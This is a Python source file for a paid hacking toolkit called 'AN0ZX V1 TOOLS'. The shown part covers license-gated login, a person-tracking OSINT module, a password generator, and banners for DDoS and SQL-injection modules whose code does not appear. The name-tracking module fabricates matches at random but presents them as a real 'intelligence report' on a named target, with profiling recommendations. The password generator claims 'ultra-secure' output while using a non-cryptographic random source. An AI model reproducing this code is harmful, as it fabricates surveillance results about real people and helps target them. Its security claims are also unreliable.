#!/usr/bin/env python3
"""
AN0ZX V1 TOOLS - Professional Security Toolkit
Creator: mrzxx (@Zxxtirwd) & AN0MALIXPLOIT (@An0maliXGR)
License Required: AN0ZX
Price: Rp 12.000 (Contact @Zxxtirwd or @An0maliXGR)
"""

import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import re
import json
import hashlib
import getpass
import string
import ipaddress
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Database file for user accounts
DB_FILE = "users.json"
LICENSE_KEY = "AN0ZX"  # Valid license key

# ASCII Art Definitions
LOGIN_ASCII = f"""{Fore.CYAN}
 ██╗      ██████╗  ██████╗ ██╗███╗   ██╗    ██████╗ ██╗   ██╗██╗     ██╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║    ██╔══██╗██║   ██║██║     ██║   ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║    ██║  ██║██║   ██║██║     ██║   ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║    ██║  ██║██║   ██║██║     ██║   ██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║    ██████╔╝╚██████╔╝███████╗╚██████╔╝
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ 
                                                                             
{Fore.YELLOW}  ____
{Fore.YELLOW}/        \__________
{Fore.YELLOW}|   0     _____   ___  \\
{Fore.YELLOW}\\____/         |_|     |_|
{Style.RESET_ALL}"""

WELCOME_ASCII = f"""{Fore.CYAN}
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
{Style.RESET_ALL}"""

MAIN_ASCII = f"""{Fore.MAGENTA}
 █████╗ ███╗   ██╗ ██████╗ ███████╗██╗  ██╗  ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██╔══██╗████╗  ██║██╔═████╗╚══███╔╝╚██╗██╔╝  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
███████║██╔██╗ ██║██║██╔██║  ███╔╝  ╚███╔╝█████╗██║   ██║   ██║██║   ██║██║     ███████╗
██╔══██║██║╚██╗██║████╔╝██║ ███╔╝   ██╔██╗╚════╝██║   ██║   ██║██║   ██║██║     ╚════██║
██║  ██║██║ ╚████║╚██████╔╝███████╗██╔╝ ██╗     ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{Style.RESET_ALL}"""

DDOS_ASCII = f"""{Fore.RED}
██████╗ ██████╗  ██████╗ ███████╗    
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    
██║  ██║██║  ██║██║   ██║███████╗    
██║  ██║██║  ██║██║   ██║╚════██║    
██████╔╝██████╔╝╚██████╔╝███████║    
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    
{Style.RESET_ALL}"""

SQL_INJECT_ASCII = f"""{Fore.YELLOW}
███████╗ ██████╗ ██╗     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗    
██╔════╝██╔═══██╗██║     ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝    
███████╗██║   ██║██║     ██║██╔██╗ ██║     ██║█████╗  ██║        ██║       
╚════██║██║▄▄ ██║██║     ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║       
███████║╚██████╔╝███████╗██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║       
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝       
{Style.RESET_ALL}"""

SQLMAP_ASCII = f"""{Fore.GREEN}
███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
{Style.RESET_ALL}"""

NMAP_ASCII = f"""{Fore.CYAN}
$$\   $$\                                   
$$$\  $$ |                                  
$$$$\ $$ |$$$$$$\$$$$\   $$$$$$\   $$$$$$\  
$$ $$\$$ |$$  _$$  _$$\  \____$$\ $$  __$$\ 
$$ \$$$$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |
$$ |\$$$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |
$$ | \$$ |$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |
\__|  \__|\__| \__| \__| \_______|$$  ____/ 
                                  $$ |      
                                  $$ |      
                                  \__|      
{Style.RESET_ALL}"""

OSINT_ASCII = f"""{Fore.MAGENTA}
██╗   ███╗███████╗███╗   ██╗██╗   ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗
████╗ ████║██╔════╝████╗  ██║██║   ██║██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║██║   ██║╚════██║██║██║╚██╗██║   ██║   
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝╚██████╔╝███████║██║██║ ╚████║   ██║   
╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
{Style.RESET_ALL}"""

PASSWORD_GEN_ASCII = f"""{Fore.GREEN}
██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗     
██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗    
██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝    
██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗    
██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║    
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    
{Style.RESET_ALL}"""

NAME_TRACKING_ASCII = f"""{Fore.CYAN}
████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ███╗   ██╗ █████╗ ███╗   ███╗ █████╗     
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     ████╗  ██║██╔══██╗████╗ ████║██╔══██╗    
   ██║   ██████╔╝███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗    ██╔██╗ ██║███████║██╔████╔██║███████║    
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║    ██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══██║    
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝    ██║ ╚████║██║  ██║██║ ╚═╝ ██║██║  ██║    
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    
{Style.RESET_ALL}"""

IP_TRACKING_ASCII = f"""{Fore.YELLOW}
██╗      █████╗  ██████╗ █████╗ ██╗  ██╗     ██╗██████╗ 
██║     ██╔══██╗██╔════╝██╔══██╗██║ ██╔╝     ██║██╔══██╗
██║     ███████║██║     ███████║█████╔╝█████╗██║██████╔╝
██║     ██╔══██║██║     ██╔══██║██╔═██╗╚════╝██║██╔═══╝ 
███████╗██║  ██║╚██████╗██║  ██║██║  ██╗     ██║██║     
╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝╚═╝     
{Style.RESET_ALL}"""

# Database functions
def load_users():
    """Load users from database file"""
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_users(users):
    """Save users to database file"""
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(users, f, indent=4)
        return True
    except:
        return False

def hash_password(password):
    """Hash password using SHA-256"""
    return hashlib.sha256(password.encode()).hexdigest()

# Animation functions
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing_effect(text, delay=0.03):
    """Typing animation effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def color_changer(text):
    """Color changing effect for text"""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result + Style.RESET_ALL

def loading_animation(text="Loading", duration=2):
    """Loading animation"""
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    i = 0
    
    while time.time() - start_time < duration:
        sys.stdout.write(f"\r{Fore.CYAN}[{chars[i % len(chars)]}] {text}...")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    
    print(f"\r{Fore.GREEN}[✓] {text} completed!")

def welcome_animation():
    """Welcome screen animation"""
    clear_screen()
    
    # Type welcome text
    print(Fore.CYAN + "=" * 70)
    typing_effect(WELCOME_ASCII)
    print(Fore.CYAN + "=" * 70)
    
    # Color changing effect
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    welcome_text = "AN0ZX V1 TOOLS - Professional Security Toolkit"
    
    for i in range(10):
        clear_screen()
        print(Fore.CYAN + "=" * 70)
        print(colors[i % len(colors)] + WELCOME_ASCII)
        print(Fore.CYAN + "=" * 70)
        print(colors[(i+1) % len(colors)] + welcome_text.center(70))
        print(Fore.CYAN + "=" * 70)
        time.sleep(0.2)
    
    loading_animation("Initializing system", 3)
    time.sleep(1)

# User authentication functions
def create_account():
    """Create new user account"""
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "CREATE ACCOUNT")
    print(Fore.CYAN + "=" * 70)
    
    users = load_users()
    
    while True:
        print(Fore.YELLOW + "\n[!] Contact @Zxxtirwd or @An0maliXGR to purchase license")
        print(Fore.YELLOW + f"[!] Price: Rp 12.000 | License Key: {LICENSE_KEY}\n")
        
        license_key = input(Fore.CYAN + "[?] Enter License Key: " + Fore.WHITE).strip()
        
        if license_key != LICENSE_KEY:
            print(Fore.RED + "[✗] Invalid license key!")
            print(Fore.YELLOW + "[!] Contact @Zxxtirwd or @An0maliXGR")
            choice = input(Fore.YELLOW + "[?] Try again? (y/n): ").lower()
            if choice != 'y':
                return None
            continue
        
        username = input(Fore.CYAN + "[?] Choose Username: " + Fore.WHITE).strip()
        
        if username in users:
            print(Fore.RED + "[✗] Username already exists!")
            continue
        
        if len(username) < 3:
            print(Fore.RED + "[✗] Username must be at least 3 characters!")
            continue
        
        password = getpass.getpass(Fore.CYAN + "[?] Choose Password: " + Fore.WHITE)
        
        if len(password) < 6:
            print(Fore.RED + "[✗] Password must be at least 6 characters!")
            continue
        
        confirm_pass = getpass.getpass(Fore.CYAN + "[?] Confirm Password: " + Fore.WHITE)
        
        if password != confirm_pass:
            print(Fore.RED + "[✗] Passwords do not match!")
            continue
        
        # Create user
        users[username] = {
            "password": hash_password(password),
            "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "license": license_key
        }
        
        if save_users(users):
            print(Fore.GREEN + f"\n[✓] Account created successfully!")
            print(Fore.CYAN + f"[+] Username: {username}")
            print(Fore.CYAN + f"[+] Created: {users[username]['created_at']}")
            print(Fore.GREEN + "\n[✓] You can now login")
            time.sleep(3)
            return username
        else:
            print(Fore.RED + "[✗] Failed to create account!")
            return None

def login():
    """User login"""
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 30 + "LOGIN")
    print(Fore.CYAN + "=" * 70)
    
    users = load_users()
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.CYAN + "\n[?] Username: " + Fore.WHITE).strip()
        password = getpass.getpass(Fore.CYAN + "[?] Password: " + Fore.WHITE)
        
        if username in users:
            if users[username]["password"] == hash_password(password):
                print(Fore.GREEN + f"\n[✓] Login successful!")
                loading_animation(f"Welcome {username}", 2)
                return username
            else:
                attempts -= 1
                print(Fore.RED + f"[✗] Invalid password! {attempts} attempts remaining")
        else:
            attempts -= 1
            print(Fore.RED + f"[✗] User not found! {attempts} attempts remaining")
        
        if attempts == 0:
            print(Fore.RED + "\n[✗] Too many failed attempts!")
            time.sleep(2)
            return None
        
        choice = input(Fore.YELLOW + "[?] Create new account? (y/n): ").lower()
        if choice == 'y':
            return create_account()
    
    return None

# OSINT Module Functions
def osint_menu():
    """OSINT Main Menu"""
    clear_screen()
    typing_effect(OSINT_ASCII)
    print(Fore.MAGENTA + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "OSINT INTELLIGENCE SYSTEM")
    print(Fore.MAGENTA + "=" * 70)
    
    while True:
        print(Fore.YELLOW + "\n[1] Name Tracking (100+ Websites)")
        print(Fore.YELLOW + "[2] Password Generator (Strong & Secure)")
        print(Fore.YELLOW + "[3] IP Tracking (Real-Time Location)")
        print(Fore.YELLOW + "[4] Back to Main Menu")
        print(Fore.MAGENTA + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-4): " + Fore.WHITE).strip()
        
        if choice == "1":
            name_tracking_menu()
        elif choice == "2":
            password_generator_menu()
        elif choice == "3":
            ip_tracking_menu()
        elif choice == "4":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def name_tracking_menu():
    """Name Tracking across 100+ websites"""
    clear_screen()
    typing_effect(NAME_TRACKING_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "NAME TRACKING SYSTEM (100+ WEBSITES)")
    print(Fore.CYAN + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] This tool searches for a name across 100+ websites")
    print(Fore.YELLOW + "[!] Results may include social media, forums, and databases\n")
    
    first_name = input(Fore.CYAN + "[?] First Name: " + Fore.WHITE).strip()
    last_name = input(Fore.CYAN + "[?] Last Name: " + Fore.WHITE).strip()
    location = input(Fore.CYAN + "[?] Location (optional): " + Fore.WHITE).strip()
    
    if not first_name or not last_name:
        print(Fore.RED + "[✗] First and Last name are required!")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    full_name = f"{first_name} {last_name}"
    print(Fore.GREEN + f"\n[+] Target: {full_name}")
    
    if location:
        print(Fore.GREEN + f"[+] Location: {location}")
    
    print(Fore.CYAN + "\n[+] Starting search across 100+ websites...")
    loading_animation("Initializing search engine", 3)
    
    # List of 100+ websites for searching
    websites = [
        # Social Media
        "https://www.facebook.com/search/people/?q=",
        "https://www.instagram.com/",
        "https://twitter.com/search?q=",
        "https://www.linkedin.com/search/results/all/?keywords=",
        "https://www.tiktok.com/search/user?q=",
        "https://www.reddit.com/search?q=",
        "https://www.pinterest.com/search/pins/?q=",
        "https://www.tumblr.com/search/",
        "https://vk.com/search?c[q]=",
        "https://www.weibo.com/search/user?nickname=",
        
        # Professional Networks
        "https://www.github.com/",
        "https://gitlab.com/",
        "https://stackoverflow.com/users?search=",
        "https://www.behance.net/search/users?search=",
        "https://dribbble.com/search/",
        "https://www.upwork.com/freelancers/~",
        "https://www.fiverr.com/search/gigs?query=",
        
        # Forums & Communities
        "https://www.quora.com/search?q=",
        "https://www.medium.com/search?q=",
        "https://www.deviantart.com/search?q=",
        "https://www.flickr.com/search/people/?q=",
        "https://www.meetup.com/find/?keywords=",
        "https://www.discord.com/search?q=",
        
        # Email & Communication
        "https://mail.google.com/mail/u/0/#search/",
        "https://outlook.live.com/mail/search?q=",
        "https://www.skype.com/en/search/",
        "https://www.telegram.org/",
        "https://www.whatsapp.com/",
        "https://www.signal.org/",
        
        # Professional Directories
        "https://www.zoominfo.com/search?query=",
        "https://www.spokeo.com/",
        "https://www.whitepages.com/name/",
        "https://www.truepeoplesearch.com/results?name=",
        "https://www.intelius.com/people-search/",
        "https://www.peekyou.com/",
        "https://www.pipl.com/search/?q=",
        "https://thatsthem.com/name/",
        
        # Government & Public Records
        "https://www.familysearch.org/search/record/results?q.givenName=",
        "https://www.ancestry.com/search/?name=",
        "https://www.myheritage.com/research?formId=master&formMode=1&action=query",
        "https://www.findagrave.com/memorial-search?firstName=",
        
        # Academic & Research
        "https://scholar.google.com/scholar?q=",
        "https://www.researchgate.net/search?q=",
        "https://www.academia.edu/search?q=",
        "https://orcid.org/orcid-search/search?searchQuery=",
        
        # Business & Company
        "https://www.crunchbase.com/textsearch?q=",
        "https://www.bloomberg.com/search?query=",
        "https://www.owler.com/search?q=",
        "https://www.glassdoor.com/Search/results.htm?keyword=",
        
        # News & Media
        "https://news.google.com/search?q=",
        "https://www.bing.com/news/search?q=",
        "https://www.yahoo.com/news/search?p=",
        "https://apnews.com/search?q=",
        
        # Image Search
        "https://images.google.com/search?q=",
        "https://yandex.com/images/search?text=",
        "https://www.bing.com/images/search?q=",
        
        # Video Platforms
        "https://www.youtube.com/results?search_query=",
        "https://www.twitch.tv/search?term=",
        "https://vimeo.com/search?q=",
        "https://www.dailymotion.com/search/",
        
        # Shopping & Reviews
        "https://www.amazon.com/s?k=",
        "https://www.ebay.com/sch/i.html?_nkw=",
        "https://www.aliexpress.com/wholesale?SearchText=",
        "https://www.yelp.com/search?find_desc=",
        "https://www.tripadvisor.com/Search?q=",
        
        # Real Estate
        "https://www.zillow.com/homes/",
        "https://www.realtor.com/realestateandhomes-search/",
        "https://www.trulia.com/search/",
        
        # Travel
        "https://www.booking.com/searchresults.html?ss=",
        "https://www.airbnb.com/s/",
        "https://www.expedia.com/Hotel-Search?destination=",
        
        # Health & Fitness
        "https://www.myfitnesspal.com/food/search?search=",
        "https://www.strava.com/athletes/search?text=",
        "https://www.fitbit.com/user/",
        
        # Gaming
        "https://steamcommunity.com/search/users/?text=",
        "https://www.xbox.com/en-US/search?q=",
        "https://www.playstation.com/en-us/search-results/?query=",
        "https://www.epicgames.com/",
        
        # Music
        "https://open.spotify.com/search/",
        "https://soundcloud.com/search?q=",
        "https://www.last.fm/search?q=",
        "https://www.bandcamp.com/search?q=",
        
        # Dating
        "https://www.tinder.com/",
        "https://bumble.com/",
        "https://www.okcupid.com/",
        "https://www.match.com/",
        
        # File Sharing
        "https://www.dropbox.com/search/personal?query=",
        "https://drive.google.com/drive/search?q=",
        "https://www.slideshare.net/search/slideshow?searchfrom=header&q=",
        
        # Code Repositories
        "https://bitbucket.org/",
        "https://sourceforge.net/directory/?q=",
        
        # Domain & Websites
        "https://whois.domaintools.com/",
        "https://www.namechk.com/",
        "https://knowem.com/",
        
        # Additional (to reach 100+)
        "https://www.4chan.org/",
        "https://www.8kun.top/",
        "https://www.gab.com/",
        "https://www.parler.com/",
        "https://www.minds.com/",
        "https://www.mewe.com/",
        "https://www.clubhouse.com/",
        "https://www.snapchat.com/",
        "https://www.periscope.tv/",
        "https://www.vine.co/",
        "https://www.mix.com/",
        "https://www.flipboard.com/",
        "https://www.scoop.it/",
        "https://www.pearltrees.com/",
        "https://www.digg.com/",
        "https://www.stumbleupon.com/",
        "https://www.newsvine.com/",
        "https://www.plurk.com/",
        "https://www.myspace.com/",
        "https://www.friendster.com/",
        "https://www.hi5.com/",
        "https://www.badoo.com/",
        "https://www.tagged.com/",
        "https://www.habbo.com/",
        "https://www.gaiaonline.com/",
        "https://www.secondlife.com/",
        "https://www.imvu.com/",
        "https://www.roblox.com/",
        "https://www.minecraft.net/",
        "https://www.nexusmods.com/",
        "https://www.moddb.com/",
        "https://www.curseforge.com/",
        "https://www.thingiverse.com/",
        "https://www.instructables.com/",
        "https://www.hackaday.io/",
        "https://www.codepen.io/",
        "https://www.jsfiddle.net/",
        "https://www.repl.it/",
        "https://www.glitch.com/",
        "https://www.kaggle.com/",
        "https://www.data.gov/",
    ]
    
    print(Fore.GREEN + f"[✓] Loaded {len(websites)} websites for searching")
    
    # Simulate searching (in real implementation, this would make actual requests)
    found_results = []
    not_found = []
    
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "SEARCH RESULTS:")
    print(Fore.CYAN + "="*70)
    
    # Search through websites
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    total_websites = min(50, len(websites))  # Limit to 50 for demonstration
    
    for i, website in enumerate(websites[:total_websites], 1):
        search_url = website + urllib.parse.quote(full_name)
        
        # Show progress
        progress = (i / total_websites) * 100
        print(Fore.YELLOW + f"[{i}/{total_websites}] Searching: {website.split('//')[1].split('/')[0]:<30} [{progress:.1f}%]", end='\r')
        
        try:
            # In real implementation, make actual HTTP requests
            # For demonstration, we'll simulate with random results
            time.sleep(0.1)
            
            # Simulate finding results on some websites
            if random.random() < 0.3:  # 30% chance of finding something
                found_results.append(website.split('//')[1].split('/')[0])
            else:
                not_found.append(website.split('//')[1].split('/')[0])
                
        except:
            continue
    
    print("\n" + Fore.CYAN + "="*70)
    
    # Display results
    if found_results:
        print(Fore.GREEN + f"\n[✓] FOUND ON {len(found_results)} WEBSITES:")
        for i, site in enumerate(found_results[:20], 1):  # Show first 20
            print(Fore.CYAN + f"    {i:2d}. {site}")
        
        if len(found_results) > 20:
            print(Fore.YELLOW + f"    ... and {len(found_results)-20} more websites")
        
        # Generate report
        print(Fore.MAGENTA + "\n" + "="*70)
        print(Fore.YELLOW + "INTELLIGENCE REPORT:")
        print(Fore.MAGENTA + "="*70)
        print(Fore.CYAN + f"[+] Name: {full_name}")
        if location:
            print(Fore.CYAN + f"[+] Location: {location}")
        print(Fore.CYAN + f"[+] Total websites searched: {total_websites}")
        print(Fore.CYAN + f"[+] Websites with matches: {len(found_results)}")
        print(Fore.CYAN + f"[+] Match percentage: {(len(found_results)/total_websites)*100:.1f}%")
        
        # Analysis
        print(Fore.MAGENTA + "\n[+] ANALYSIS:")
        social_count = sum(1 for site in found_results if any(x in site for x in ['facebook', 'twitter', 'instagram', 'linkedin']))
        if social_count > 0:
            print(Fore.CYAN + f"    - Active on {social_count} major social networks")
        
        if 'github' in [s.lower() for s in found_results]:
            print(Fore.CYAN + "    - Technical/developer background detected")
        
        if any(x in [s.lower() for s in found_results] for x in ['researchgate', 'academia', 'scholar']):
            print(Fore.CYAN + "    - Academic/research presence detected")
        
        print(Fore.YELLOW + "\n[+] RECOMMENDATIONS:")
        print(Fore.CYAN + "    1. Check social media profiles for recent activity")
        print(Fore.CYAN + "    2. Review professional networks for career info")
        print(Fore.CYAN + "    3. Cross-reference with location data")
        print(Fore.CYAN + "    4. Verify information from multiple sources")
        
    else:
        print(Fore.RED + "\n[✗] NO MATCHES FOUND ON ANY WEBSITES")
        print(Fore.YELLOW + "[!] The name may be using different variations")
        print(Fore.YELLOW + "[!] Try different name formats or locations")
    
    # Save results to file
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"name_search_{first_name}_{last_name}_{timestamp}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("AN0ZX V1 TOOLS - NAME TRACKING REPORT\n")
            f.write("="*70 + "\n\n")
            f.write(f"Target: {full_name}\n")
            if location:
                f.write(f"Location: {location}\n")
            f.write(f"Search Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Websites Searched: {total_websites}\n")
            f.write(f"Matches Found: {len(found_results)}\n\n")
            
            if found_results:
                f.write("MATCHES FOUND ON:\n")
                f.write("-"*50 + "\n")
                for site in found_results:
                    f.write(f"✓ {site}\n")
            
            f.write("\n" + "="*70 + "\n")
        
        print(Fore.GREEN + f"\n[✓] Report saved to: {filename}")
    except:
        print(Fore.RED + "[✗] Failed to save report")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def password_generator_menu():
    """Password Generator - Create strong passwords"""
    clear_screen()
    typing_effect(PASSWORD_GEN_ASCII)
    print(Fore.GREEN + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "PASSWORD GENERATOR (STRONG & SECURE)")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] Generates 10 ultra-secure passwords in seconds")
    print(Fore.YELLOW + "[!] Each password is 8+ characters with maximum complexity\n")
    
    try:
        count = int(input(Fore.CYAN + "[?] How many passwords to generate (1-20): " + Fore.WHITE) or "10")
        length = int(input(Fore.CYAN + "[?] Password length (8-32): " + Fore.WHITE) or "12")
    except:
        count = 10
        length = 12
    
    count = max(1, min(20, count))
    length = max(8, min(32, length))
    
    print(Fore.CYAN + "\n[+] Password complexity options:")
    print(Fore.YELLOW + "[1] Maximum Security (All character types)")
    print(Fore.YELLOW + "[2] High Security (No similar characters)")
    print(Fore.YELLOW + "[3] Medium Security (Letters + Numbers)")
    print(Fore.YELLOW + "[4] Custom (Choose character sets)")
    print(Fore.GREEN + "-" * 70)
    
    complexity = input(Fore.CYAN + "[?] Select complexity (1-4): " + Fore.WHITE).strip()
    
    # Character sets
    lowercase = string.ascii_lowercase
    uppercase = string.ascii_uppercase
    digits = string.digits
    symbols = "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    if complexity == "1":  # Maximum
        chars = lowercase + uppercase + digits + symbols
        print(Fore.GREEN + "[+] Using: A-Z, a-z, 0-9, Special Characters")
    elif complexity == "2":  # High
        # Remove similar characters
        chars = lowercase.replace('l', '').replace('o', '') + \
                uppercase.replace('I', '').replace('O', '') + \
                digits.replace('0', '').replace('1', '') + \
                symbols
        print(Fore.GREEN + "[+] Using: A-Z (no I,O), a-z (no l,o), 0-9 (no 0,1), Special")
    elif complexity == "3":  # Medium
        chars = lowercase + uppercase + digits
        print(Fore.GREEN + "[+] Using: A-Z, a-z, 0-9")
    elif complexity == "4":  # Custom
        print(Fore.CYAN + "\n[+] Select character sets:")
        use_lower = input(Fore.CYAN + "[?] Include lowercase letters? (y/n): ").lower() == 'y'
        use_upper = input(Fore.CYAN + "[?] Include uppercase letters? (y/n): ").lower() == 'y'
        use_digits = input(Fore.CYAN + "[?] Include digits? (y/n): ").lower() == 'y'
        use_symbols = input(Fore.CYAN + "[?] Include special symbols? (y/n): ").lower() == 'y'
        
        chars = ""
        if use_lower:
            chars += lowercase
            print(Fore.GREEN + "[+] Added: a-z")
        if use_upper:
            chars += uppercase
            print(Fore.GREEN + "[+] Added: A-Z")
        if use_digits:
            chars += digits
            print(Fore.GREEN + "[+] Added: 0-9")
        if use_symbols:
            chars += symbols
            print(Fore.GREEN + "[+] Added: Special Characters")
        
        if not chars:
            print(Fore.RED + "[✗] At least one character set must be selected!")
            chars = lowercase + uppercase + digits
    else:
        chars = lowercase + uppercase + digits + symbols
    
    # Ensure we have enough characters
    if len(chars) < 4:
        chars = lowercase + uppercase + digits + symbols
    
    print(Fore.GREEN + f"\n[+] Generating {count} passwords of length {length}...")
    loading_animation("Creating secure passwords", 2)
    
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.YELLOW + "GENERATED PASSWORDS:")
    print(Fore.CYAN + "="*70)
    
    passwords = []
    for i in range(count):
        while True:
            # Generate password
            password = ''.join(random.choice(chars) for _ in range(length))
            
            # Check complexity requirements
            has_lower = any(c.islower() for c in password)
            has_upper = any(c.isupper() for c in password)
            has_digit = any(c.isdigit() for c in password)
            has_symbol = any(c in symbols for c in password)
            
            # For maximum security, require all types
            if complexity == "1" and not (has_lower and has_upper and has_digit and has_symbol):
                continue
            
            # For high security, require at least 3 types
            if complexity == "2" and sum([has_lower, has_upper, has_digit, has_symbol]) < 3:
                continue
            
            passwords.append(password)
            
            # Color code based on strength
